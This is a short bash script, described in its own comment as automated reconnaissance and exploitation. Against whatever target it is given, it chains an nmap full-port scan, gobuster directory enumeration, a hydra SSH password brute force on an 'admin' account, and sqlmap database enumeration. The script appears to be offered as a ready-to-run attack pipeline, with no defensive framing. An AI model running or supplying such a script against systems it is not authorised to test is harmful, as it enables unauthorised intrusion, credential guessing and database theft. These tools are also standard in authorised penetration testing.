#!/bin/bash
# Automated reconnaissance and exploitation script
echo "Starting reconnaissance..."
nmap -sV -p- $1 > nmap_results.txt

echo "Scanning for directories..."
gobuster dir -u http://$1 -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt

echo "Attempting brute force login..."
hydra -l admin -P passwords.txt ssh://$1 -t 4 > hydra_results.txt

echo "Exploitation phase..."
sqlmap -u "http://$1/vulnerable.php?id=1" --dbs > sqlmap_results.txt
